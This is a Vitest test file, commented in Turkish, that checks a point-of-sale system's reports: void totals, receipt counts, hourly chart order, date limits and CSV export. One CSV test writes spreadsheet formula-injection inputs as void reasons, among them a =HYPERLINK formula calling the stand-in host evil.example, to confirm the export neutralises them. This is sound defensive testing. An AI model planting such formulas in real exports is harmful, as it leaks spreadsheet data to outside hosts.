import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import { tlPlain } from '@shared/money';
import { calcOrder } from '@shared/order-calc';
import { BUSINESS_HOURS, currentBusinessDate } from '@shared/time';
import type { BootstrapDTO, OrderDTO, ZSummary } from '@shared/types';
import { hourBars, periodRange } from '../src/lib/period';
import { type Harness, PINS, startApp } from './harness';

/**
 * Raporlar denetimi (26 Eki 2026), her bulgu bir testle: iptaller her adisyondan (açık, başka masaya taşınmış)
 * sayılır; adisyon sayısı ve satılan ürün her ekranda (personel ve saatlik dahil) aynı tanımla; CSV'de formül ve
 * satır bölme yok, ondalık virgüllü; saatlik grafik iş günü sırasıyla (05:00'ten), 24 saati aşan günün ertesi sabahı
 * gecenin ardından; "Bugün" açık iş günü; dönem en çok 400 gün ve gerçek tarih; 32.766'dan çok adisyonlu dönem ve
 * adisyon listesinin gerçek sayısı.
 *
 * İnceleme turu (27 Eki 2026) bulguları da burada: ₺0 adisyonun personel ve saatlik raporda sayılması, 05:00'i geçen
 * günün saatlik grafiği, Raporlar › Aktarım'daki lafmaliyet satış listesi, Z ürün listesinin ilk 15 olması.
 *
 * Saat sahte (yalnız Date): geçen pazartesi bir gün, bu pazartesi açık kalan bir gün. Oturum 14 saat; her saat
 * sıçramasında yeniden giriş yapılır.
 */
let h: Harness;
const MUDUR = PINS.mudur;
const root = join(__dirname, '..');

async function at(iso: string) {
  vi.setSystemTime(new Date(iso));
  if (h) for (const [who, pin] of Object.entries(PINS)) await h.login(who, pin);
}

const product = (name: string) => h.boot.products.find((p) => p.name === name)!;
const method = (name: string) => h.boot.paymentMethods.find((m) => m.name === name)!;
const masa = (i: number) => h.boot.tables.filter((t) => t.kind !== 'oda')[i]!;
type Line = { name: string; qty?: number; size?: 'M' | 'L' };
const add = (o: OrderDTO, lines: Line[], who = 'kasa') =>
  h.ok<OrderDTO>(who, 'POST', `/orders/${o.id}/items`, { items: lines.map((l) => ({ productId: product(l.name).id, qty: l.qty ?? 1, ...(l.size ? { size: l.size } : {}) })) });

/** Nakitle ödenmiş tezgâh satışı */
async function sale(lines: Line[]) {
  let o = await h.ok<OrderDTO>('kasa', 'POST', '/orders', { type: 'tezgah' });
  o = await add(o, lines);
  await h.ok('kasa', 'POST', `/orders/${o.id}/payments`, { methodId: method('Nakit').id, amount: o.total });
  return o;
}

/** Tamamı ikram edilip "Sıfır tutarlı adisyonu kapat"la kapanan adisyon */
async function freeCheck(lines: Line[]) {
  let o = await h.ok<OrderDTO>('kasa', 'POST', '/orders', { type: 'gelal' });
  o = await add(o, lines);
  for (const i of o.items) o = await h.ok<OrderDTO>('kasa', 'POST', `/orders/${o.id}/items/${i.id}/comp`, { reason: 'Patron misafiri', approverPin: MUDUR });
  await h.ok('kasa', 'POST', `/orders/${o.id}/close`, {});
}

/** Excel gibi okur: ; ayraç; tırnak içinde ; ve satır sonu metindir, dışında CR, LF ya da CRLF satırı bitirir */
function parseCsv(text: string): string[][] {
  const s = text.replace(/^﻿/, '');
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let quoted = false;
  for (let i = 0; i < s.length; i++) {
    const ch = s[i]!;
    if (quoted) {
      if (ch !== '"') cell += ch;
      else if (s[i + 1] === '"') {
        cell += '"';
        i++;
      } else quoted = false;
    } else if (ch === '"' && cell === '') quoted = true;
    else if (ch === ';') {
      row.push(cell);
      cell = '';
    } else if (ch === '\r' || ch === '\n') {
      if (ch === '\r' && s[i + 1] === '\n') i++;
      row.push(cell);
      rows.push(row);
      row = [];
      cell = '';
    } else cell += ch;
  }
  if (cell || row.length) rows.push([...row, cell]);
  return rows;
}

const csv = async (query: string) => {
  const r = await h.call<string>('mudur', 'GET', `/reports/export.csv?${query}`);
  expect(r.status, query).toBe(200);
  return parseCsv(r.json);
};

beforeAll(async () => {
  vi.useFakeTimers({ toFake: ['Date'] });
  // Geçen pazartesi: biri ödenmiş, biri tamamı ikram (₺0) iki adisyon; gün kapanır
  vi.setSystemTime(new Date('2026-10-19T09:00:00+03:00'));
  h = await startApp();
  await h.ok('kasa', 'POST', '/cash/day/open', { openingCash: 0 });
  await sale([{ name: 'Türk kahvesi' }]);
  await freeCheck([{ name: 'Türk kahvesi' }]);
  await at('2026-10-19T22:00:00+03:00');
  await h.ok('mudur', 'POST', '/cash/day/close', { countedCash: null });
  // Bu pazartesi gün açılır ve sonuna kadar açık kalır (masa açık kaldığı için gece 05:00'i geçer)
  await at('2026-10-26T09:00:00+03:00');
  await h.ok('kasa', 'POST', '/cash/day/open', { openingCash: 0 });
});

afterAll(() => {
  vi.useRealTimers();
  h.cleanup();
});

describe('raporlar denetimi', () => {
  it('iptal her adisyondan sayılır: açık ve taşınmış adisyondaki iptal özet, patron, personel, ürün ve listede X ile aynı (money-15, reports-31)', async () => {
    await at('2026-10-26T10:00:00+03:00');
    await sale([{ name: 'Türk kahvesi' }]);

    // Açık masa: 4 büyük latte barda hazırlandı, hesap yazdırıldı, 3'ü müdürce iptal; adisyon açık kalır
    let open = await h.ok<OrderDTO>('garson', 'POST', '/orders', { type: 'masa', tableId: masa(0).id, guests: 2 });
    open = await add(open, [{ name: 'Latte', size: 'L', qty: 4 }], 'garson');
    await h.ok('kasa', 'POST', '/kitchen/status', { itemIds: [open.items[0]!.id], status: 'servis' });
    await h.ok('garson', 'POST', `/orders/${open.id}/bill`, {});
    await h.ok('mudur', 'POST', `/orders/${open.id}/items/${open.items[0]!.id}/void`, { qty: 3, reason: 'Fiyat itirazı' });

    // Taşınan adisyon: hazırlanan kalem onayla iptal, kalanı başka masaya; kaynakta yalnız iptal kalır (birlesti)
    let moved = await h.ok<OrderDTO>('garson', 'POST', '/orders', { type: 'masa', tableId: masa(1).id });
    moved = await add(moved, [{ name: 'Türk kahvesi' }], 'garson');
    moved = await add(moved, [{ name: 'Türk kahvesi' }], 'garson');
    const [prepared, rest] = moved.items;
    await h.ok('kasa', 'POST', '/kitchen/status', { itemIds: [prepared!.id], status: 'hazirlaniyor' });
    await h.ok('garson', 'POST', `/orders/${moved.id}/items/${prepared!.id}/void`, { reason: 'Müşteri vazgeçti', approverPin: MUDUR });
    const tr = await h.ok<{ source: OrderDTO }>('garson', 'POST', `/orders/${moved.id}/transfer`, { items: [{ itemId: rest!.id, qty: 1 }], tableId: masa(2).id });
    expect(tr.source.status).toBe('birlesti');

    const x = await h.ok<{ summary: ZSummary }>('mudur', 'GET', '/cash/day');
    const summary = await h.ok<{ voided: number }>('mudur', 'GET', '/reports/summary');
    const patron = await h.ok<{ voided: number; anomalies: { title: string }[] }>('patron', 'GET', '/reports/patron');
    const list = await h.ok<{ total: number; count: number; rows: { qty: number }[] }>('mudur', 'GET', '/reports/items?kind=iptal');
    const staff = await h.ok<{ staff: { voids: number; voidValue: number }[] }>('patron', 'GET', '/reports/staff');
    const products = await h.ok<{ products: { voided: number }[] }>('mudur', 'GET', '/reports/products');

    const X = x.summary.voided;
    expect(X).toBe(3 * product('Latte').priceL! + product('Türk kahvesi').price);
    expect(x.summary.voidAfterSendCount).toBe(2);
    expect(list.total).toBe(X);
    expect(summary.voided).toBe(X);
    expect(patron.voided).toBe(X);
    expect(staff.staff.reduce((a, r) => a + r.voidValue, 0)).toBe(X);
    const qty = list.rows.reduce((a, r) => a + r.qty, 0);
    expect(qty).toBe(4);
    expect(staff.staff.reduce((a, r) => a + r.voids, 0)).toBe(qty);
    expect(products.products.reduce((a, p) => a + p.voided, 0)).toBe(qty);
    expect((await csv('type=iptal')).length - 1).toBe(list.count);
    // İptal oranı açık adisyonlarla birlikte: satılanın çoğu iptal edildi
    expect(patron.anomalies.map((a) => a.title)).toContain('İptal oranı yüksek');
  });

  it('adisyon sayısı her ekranda aynı: ₺0 adisyon sayılmaz, satılan ürün ikramı saymaz, geçen hafta aynı ölçütle (reports-35, client-63)', async () => {
    await at('2026-10-26T11:00:00+03:00');
    await sale([{ name: 'Latte', size: 'M', qty: 3 }]);
    await freeCheck([{ name: 'Latte', size: 'L', qty: 2 }]);

    const summary = await h.ok<{ receipts: number; avgCheck: number; itemsSold: number; types: { type: string; orders: number }[] }>('mudur', 'GET', '/reports/summary');
    const patron = await h.ok<{ orders: number; avgCheck: number; compare: { lastWeek: { orders: number } } }>('patron', 'GET', '/reports/patron');
    const products = await h.ok<{ products: { qty: number; complimentary: number }[] }>('mudur', 'GET', '/reports/products');
    const x = await h.ok<{ summary: ZSummary }>('mudur', 'GET', '/cash/day');

    expect(summary.receipts).toBe(x.summary.receipts);
    expect(patron.orders).toBe(summary.receipts);
    expect(patron.avgCheck).toBe(summary.avgCheck);
    // Türe göre kırılımın "N adisyon"u da aynı ölçütle: ₺0 gel-al adisyonu sayılmaz
    expect(summary.types.reduce((a, t) => a + t.orders, 0)).toBe(summary.receipts);
    expect(summary.types.map((t) => t.type)).not.toContain('gelal');
    // "Satılan ürün" ürün raporunun adedi ve Z'nin ürün listesiyle aynı; ikram ayrı
    expect(summary.itemsSold).toBe(products.products.reduce((a, p) => a + p.qty, 0));
    expect(summary.itemsSold).toBe(x.summary.topProducts.reduce((a, p) => a + p.qty, 0));
    expect(products.products.reduce((a, p) => a + p.complimentary, 0)).toBe(2);
    // Geçen pazartesi bu saate kadar: bir ödenmiş, bir ₺0 adisyon → kıyas da 1 adisyon
    expect(patron.compare.lastWeek.orders).toBe(1);
  });

  it('personel ve saatlik raporun "adisyon"u da ₺0 adisyonu saymaz: ortalama ve saatlik CSV Adisyon kutusuyla aynı (reports-35, client-63)', async () => {
    // Geçen pazartesi: kasa bir ödenmiş, bir tamamı ikram adisyon; bugün de ₺0 adisyon var
    for (const q of ['from=2026-10-19&to=2026-10-19', 'from=2026-10-26&to=2026-10-26', 'from=2026-10-19&to=2026-10-26']) {
      const summary = await h.ok<{ receipts: number; avgCheck: number }>('mudur', 'GET', `/reports/summary?${q}`);
      const staff = await h.ok<{ staff: { name: string; orders: number; revenue: number; comps: number }[] }>('patron', 'GET', `/reports/staff?${q}`);
      const hourly = await h.ok<{ hours: { orders: number }[]; parts: { orders: number }[]; busiest: { orders: number } | null }>('mudur', 'GET', `/reports/hourly?${q}`);
      const saatlik = await csv(`type=saatlik&${q}`);
      const col = saatlik[0]!.indexOf('Adisyon');
      expect(summary.receipts, q).toBeGreaterThan(0);
      expect(staff.staff.reduce((a, r) => a + r.orders, 0), `${q} personel adisyon`).toBe(summary.receipts);
      expect(hourly.hours.reduce((a, r) => a + r.orders, 0), `${q} saatlik adisyon`).toBe(summary.receipts);
      expect(hourly.parts.reduce((a, r) => a + r.orders, 0), `${q} gün dilimleri`).toBe(summary.receipts);
      expect(saatlik.slice(1).reduce((a, r) => a + Number(r[col]), 0), `${q} saatlik CSV`).toBe(summary.receipts);
    }
    // Geçen pazartesi yalnız kasa sattı: personel ortalaması ciro ortalamasıyla aynı; ₺0 adisyonun ikramı yine yazılır
    const q = 'from=2026-10-19&to=2026-10-19';
    const summary = await h.ok<{ receipts: number; avgCheck: number }>('mudur', 'GET', `/reports/summary?${q}`);
    const staff = await h.ok<{ staff: { name: string; orders: number; revenue: number; comps: number }[] }>('patron', 'GET', `/reports/staff?${q}`);
    const kasa = staff.staff.find((r) => r.name === 'Kasa')!;
    expect(kasa.orders).toBe(1);
    expect(Math.round(kasa.revenue / kasa.orders)).toBe(summary.avgCheck);
    expect(kasa.comps).toBe(1);
    const hourly = await h.ok<{ busiest: { hour: number; orders: number } | null }>('mudur', 'GET', `/reports/hourly?${q}`);
    expect(hourly.busiest).toMatchObject({ hour: 9, orders: 1 });
  });

  it('CSV: hücre formül gibi başlamaz, CR ve LF satır bölmez, sayılar virgüllü ondalık (reports-32, input-69, reports-37)', async () => {
    await at('2026-10-26T12:00:00+03:00');
    // Garson kendi yeni kalemini onaysız iptal eder; neden serbest metin
    let o = await h.ok<OrderDTO>('garson', 'POST', '/orders', { type: 'tezgah' });
    for (let i = 0; i < 3; i++) o = await add(o, [{ name: 'Türk kahvesi' }], 'garson');
    const reasons = ['=HYPERLINK("http://evil.example/?d="&A1,"Detay")', 'Yanlış\r=1+1', '@SUM(1+1); -2+3\n"tırnak"'];
    for (const [i, reason] of reasons.entries()) await h.ok('garson', 'POST', `/orders/${o.id}/items/${o.items[i]!.id}/void`, { reason });

    const list = await h.ok<{ count: number }>('mudur', 'GET', '/reports/items?kind=iptal');
    const rows = await csv('type=iptal');
    expect(rows).toHaveLength(list.count + 1);
    for (const r of rows) expect(r).toHaveLength(9);
    for (const cell of rows.flat()) expect(cell).not.toMatch(/^[=+\-@\t\r]/);
    // Metin kaybolmaz: başına konan ' Excel'de görünmez, hücre yazı olarak kalır
    const written = rows.slice(1).map((r) => r[6]);
    for (const reason of reasons) expect(written).toContain(/^[=+\-@]/.test(reason) ? `'${reason}` : reason);

    // Ürün CSV'si: pay yüzdesi de para gibi virgüllü (Türkçe Excel noktayı tarih ya da metin okur)
    const urunler = await csv('type=urunler');
    const share = urunler[0]!.indexOf('Pay %');
    const shares = urunler.slice(1).map((r) => r[share]!);
    expect(shares.some((s) => s.includes(','))).toBe(true);
    for (const s of shares) expect(s).toMatch(/^\d+(,\d+)?$/);
    const ciro = urunler[0]!.indexOf('Ciro');
    for (const r of urunler.slice(1)) expect(r[ciro]).toMatch(/^\d{1,3}(\.\d{3})*,\d{2}$/);
  });

  it('saatlik grafik iş günü sırasıyla: gece 01:30 satışı sabahki satışlardan sonra gelir (client-64)', async () => {
    await at('2026-10-27T01:30:00+03:00');
    await sale([{ name: 'Türk kahvesi', qty: 2 }]);
    const patron = await h.ok<{ date: string; hourly: number[]; hourlyLastWeek: number[] }>('patron', 'GET', '/reports/patron');
    expect(patron.date).toBe('2026-10-26');
    expect(patron.hourly[1]).toBe(2 * product('Türk kahvesi').price);

    const bars = hourBars(patron);
    const labels = bars.map((b) => b.label);
    expect(labels.indexOf('01')).toBeGreaterThan(labels.indexOf('10'));
    expect(labels.indexOf('01')).toBeGreaterThan(labels.indexOf('23'));
    expect(labels[0]).toBe('07');
    expect(labels.at(-1)).toBe('01');
    expect(bars.reduce((a, b) => a + b.value, 0)).toBe(patron.hourly.reduce((a, v) => a + v, 0));
    // Ekranlar bu sırayı kullanır
    for (const f of ['src/pages/patron/PatronPage.tsx', 'src/pages/admin/OverviewAdmin.tsx']) expect(readFileSync(join(root, f), 'utf8'), f).toContain('hourBars(');
  });

  it('gün 05:00\'i geçince ertesi sabahın satışı grafikte gecenin ardından, sabahki saate karışmadan (client-64 varyantı, client-59 senaryosu)', async () => {
    // Gün kapanmadı (masa açık kaldı): 27 Ekim 06:30 satışı hâlâ 26 Ekim iş gününe yazılır
    await at('2026-10-27T06:30:00+03:00');
    await sale([{ name: 'Türk kahvesi', qty: 3 }]);
    await at('2026-10-27T06:45:00+03:00');
    const price = product('Türk kahvesi').price;

    const patron = await h.ok<{ date: string; netSales: number; hourly: number[]; hourlyLastWeek: number[]; hourlyNextDay: number[]; hourlyLastWeekNextDay: number[] }>('patron', 'GET', '/reports/patron');
    expect(patron.date).toBe('2026-10-26');
    expect(patron.hourly[1]).toBe(2 * price);
    // 26 Ekim'in 06'sı (sabah, satış yok) ile 27 Ekim'in 06'sı ayrı: ikincisi iş gününün 25. saati
    expect(patron.hourly[6]).toBe(0);
    expect(patron.hourlyNextDay[1]).toBe(3 * price);
    expect([...patron.hourly, ...patron.hourlyNextDay].reduce((a, v) => a + v, 0)).toBe(patron.netSales);

    const bars = hourBars(patron);
    const keys = bars.map((b) => b.key);
    const late = bars.findIndex((b) => b.nextDay && b.label === '06');
    expect(late, keys.join(',')).toBeGreaterThan(-1);
    expect(bars[late]).toMatchObject({ value: 3 * price, title: '06:00 · ertesi gün' });
    // Grafikte 01:30 ve 10:00 satışlarından sonra, en sonda
    expect(late).toBeGreaterThan(bars.findIndex((b) => !b.nextDay && b.label === '01'));
    expect(late).toBeGreaterThan(bars.findIndex((b) => !b.nextDay && b.label === '10'));
    expect(late).toBe(bars.length - 1);
    expect(bars.filter((b) => b.label === '06' && b.value > 0)).toHaveLength(1);
    expect(new Set(keys).size).toBe(keys.length);
    expect(bars.reduce((a, b) => a + b.value, 0)).toBe(patron.netSales);

    // Tek günlük saatlik rapor ve CSV aynı sırayla: iş gününün saatleri, gün uzadıysa ertesi günün saatleri sonda
    const rep = await h.ok<{ total: number; hours: { hour: number; offset: number; nextDay: boolean; revenue: number }[] }>('mudur', 'GET', '/reports/hourly?from=2026-10-26&to=2026-10-26');
    expect(rep.hours.map((x) => x.offset)).toEqual(rep.hours.map((_, i) => i));
    expect(rep.hours[0]).toMatchObject({ hour: 5, offset: 0, nextDay: false });
    expect(rep.hours.at(-1)).toMatchObject({ hour: 6, offset: 25, nextDay: true, revenue: 3 * price });
    expect(rep.hours.find((x) => x.offset === 1)).toMatchObject({ hour: 6, revenue: 0 });
    expect(rep.hours.reduce((a, x) => a + x.revenue, 0)).toBe(rep.total);
    const saatlik = await csv('type=saatlik&from=2026-10-26&to=2026-10-26');
    expect(saatlik.slice(1).map((r) => r[0])).toEqual(rep.hours.map((x) => `${String(x.hour).padStart(2, '0')}:00${x.nextDay ? ' (ertesi gün)' : ''}`));
    expect(saatlik.at(-1)).toEqual(['06:00 (ertesi gün)', '1', tlPlain(3 * price)]);

    // Çok günlük dönemde saat günün saatidir (dağılım): 24 satır, 06:30 satışı 06'da
    const week = await h.ok<{ total: number; hours: { hour: number; nextDay: boolean; revenue: number }[] }>('mudur', 'GET', '/reports/hourly?from=2026-10-19&to=2026-10-26');
    expect(week.hours).toHaveLength(24);
    expect(week.hours.map((x) => x.hour)).toEqual([...BUSINESS_HOURS]);
    expect(week.hours.some((x) => x.nextDay)).toBe(false);
    expect(week.hours.find((x) => x.hour === 6)!.revenue).toBe(3 * price);
    expect(week.hours.reduce((a, x) => a + x.revenue, 0)).toBe(week.total);
  });

  it('"Bugün" açık iş günüdür: gün 05:00\'i geçince de raporlar patron paneliyle aynı günü gösterir (client-59)', async () => {
    await at('2026-10-27T11:00:00+03:00');
    await sale([{ name: 'Türk kahvesi' }]);
    const boot = await h.ok<BootstrapDTO>('patron', 'GET', '/bootstrap');
    expect(boot.day?.date).toBe('2026-10-26');
    const today = currentBusinessDate(boot.day?.date);
    const r = periodRange('bugun', today);
    expect(r).toEqual({ from: '2026-10-26', to: '2026-10-26' });
    expect(periodRange('dun', today)).toEqual({ from: '2026-10-25', to: '2026-10-25' });
    expect(periodRange('hafta', today)).toEqual({ from: '2026-10-26', to: '2026-10-26' });

    const patron = await h.ok<{ date: string; netSales: number; orders: number }>('patron', 'GET', '/reports/patron');
    const rep = await h.ok<{ netSales: number; receipts: number }>('mudur', 'GET', `/reports/summary?from=${r.from}&to=${r.to}`);
    expect(patron.date).toBe(r.from);
    expect(rep.netSales).toBeGreaterThan(0);
    expect(rep.netSales).toBe(patron.netSales);
    expect(rep.receipts).toBe(patron.orders);
    // Sunucunun varsayılan dönemi de açık gün; kıyası aynı saate kadar
    const def = await h.ok<{ range: { from: string; to: string }; previous: { label: string } }>('mudur', 'GET', '/reports/summary');
    expect(def.range).toEqual(r);
    expect(def.previous.label).toContain('aynı saate kadar');
    // Gün kapanınca "bugün" saatin iş günüdür
    expect(currentBusinessDate(null, Date.parse('2026-10-27T11:00:00+03:00'))).toBe('2026-10-27');
    expect(currentBusinessDate(null, Date.parse('2026-10-27T04:59:00+03:00'))).toBe('2026-10-26');
    // Raporlar ekranı bu kuralı açılış verisindeki açık günle kullanır; gün açılıp kapanınca açılış verisi yenilenir
    expect(readFileSync(join(root, 'src/pages/reports/ReportsPage.tsx'), 'utf8')).toContain('currentBusinessDate(boot.day?.date)');
    expect(readFileSync(join(root, 'src/lib/live.ts'), 'utf8')).toMatch(/startsWith\('day\.'\)\) qc\.invalidateQueries\(\{ queryKey: \['bootstrap'\] \}\)/);
  });

  it('dönem en çok 400 gün; olmayan tarih 500 değil 422 (input-66, input-72)', async () => {
    for (const q of ['from=2026-13-01&to=2026-13-01', 'from=2026-00-00', 'from=2026-02-30&to=2026-03-01', 'to=2026-04-31', 'from=0001-01-01']) {
      const r = await h.call<{ code: string }>('mudur', 'GET', `/reports/summary?${q}`);
      expect(r.status, q).toBe(422);
      expect(r.json.code, q).toBe('validation');
    }
    for (const path of ['/reports/summary', '/reports/checks', '/reports/export.csv?type=adisyonlar']) {
      const r = await h.call<{ error: string; code: string }>('mudur', 'GET', `${path}${path.includes('?') ? '&' : '?'}from=1990-01-01&to=2026-10-26`);
      expect(r.status, path).toBe(422);
      expect(r.json.code).toBe('range_too_long');
      expect(r.json.error).toMatch(/400 gün/);
    }
    // 400 gün (sınır dahil) çalışır; ters verilen tarihler çevrilir
    expect((await h.call('mudur', 'GET', '/reports/summary?from=2025-09-22&to=2026-10-26')).status).toBe(200);
    expect((await h.call('mudur', 'GET', '/reports/summary?from=2026-10-26&to=2025-09-22')).status).toBe(200);
    expect((await h.call('mudur', 'GET', '/reports/summary?from=2025-09-21&to=2026-10-26')).status).toBe(422);
  });

  it('32.766\'dan çok adisyonlu dönem: raporlar çalışır, adisyon listesi gerçek sayıyı verir, CSV hepsini yazar (input-65, reports-34)', async () => {
    // 2025 Mart: 30 gün × 1.100 kapanmış adisyon (bir Latte M, nakit) = 33.000; SQLite tek sorguda 32.766 değişken alır
    const DAYS = 30;
    const PER_DAY = 1100;
    const latte = product('Latte');
    const cash = method('Nakit');
    const { sqlite } = await import('../server/db/client');
    const insDay = sqlite.prepare('insert into business_days (id, date, z_no, opened_at, closed_at, last_order_no, opening_cash) values (?, ?, ?, ?, ?, ?, 0)');
    const insOrder = sqlite.prepare(
      "insert into orders (id, day_id, no, type, status, guests, opened_at, closed_at, total, paid, totals, updated_at, source) values (?, ?, ?, 'tezgah', 'kapali', 1, ?, ?, ?, ?, ?, ?, 'pos')",
    );
    const insItem = sqlite.prepare(
      "insert into order_items (id, order_id, product_id, name, size, qty, unit_price, base_price, kdv_rate, status, sent_at, paid_qty, created_at) values (?, ?, ?, 'Latte', 'M', 1, ?, ?, 10, 'servis', ?, 1, ?)",
    );
    const insPay = sqlite.prepare("insert into payments (id, order_id, day_id, method_id, method_name, z_field, amount, created_at) values (?, ?, ?, ?, ?, 'cash', ?, ?)");
    const totals = (itemId: string) => JSON.stringify(calcOrder({ lines: [{ id: itemId, qty: 1, unitPrice: latte.price, kdvRate: 10, discount: 0, complimentary: false, voided: false }] }));
    sqlite.transaction(() => {
      for (let d = 0; d < DAYS; d++) {
        const date = `2025-03-${String(d + 1).padStart(2, '0')}`;
        const start = Date.parse(`${date}T08:00:00+03:00`);
        insDay.run(`bulk-day-${d}`, date, 1000 + d, start, start + 16 * 3600_000, PER_DAY);
        for (let n = 0; n < PER_DAY; n++) {
          const id = `bulk-${d}-${n}`;
          const t = start + n * 50_000;
          insOrder.run(id, `bulk-day-${d}`, n + 1, t, t + 600_000, latte.price, latte.price, totals(`${id}-i`), t);
          insItem.run(`${id}-i`, id, latte.id, latte.price, latte.price, t, t);
          insPay.run(`${id}-p`, id, `bulk-day-${d}`, cash.id, cash.name, latte.price, t);
        }
      }
    })();
    const N = DAYS * PER_DAY;
    const q = 'from=2025-03-01&to=2025-03-30';
    for (const path of ['summary', 'products', 'hourly', 'prep', 'staff', 'refunds', 'checks', 'items?kind=iptal', 'items?kind=indirim']) {
      const r = await h.call('patron', 'GET', `/reports/${path}${path.includes('?') ? '&' : '?'}${q}`);
      expect(r.status, path).toBe(200);
    }
    const summary = await h.ok<{ receipts: number; netSales: number; itemsSold: number }>('mudur', 'GET', `/reports/summary?${q}`);
    expect(summary).toMatchObject({ receipts: N, netSales: N * latte.price, itemsSold: N });
    const hourly = await h.ok<{ total: number }>('mudur', 'GET', `/reports/hourly?${q}`);
    expect(hourly.total).toBe(N * latte.price);

    // Ekran en yeni 300 adisyonu gösterir ama gerçek sayıyı verir; CSV hepsini yazar
    const checks = await h.ok<{ count: number; rows: { no: number }[] }>('mudur', 'GET', `/reports/checks?${q}`);
    expect(checks.count).toBe(N);
    expect(checks.rows).toHaveLength(300);
    expect(checks.rows[0]!.no).toBe(PER_DAY);
    expect(await csv(`type=adisyonlar&${q}`)).toHaveLength(N + 1);
  }, 120_000);
});
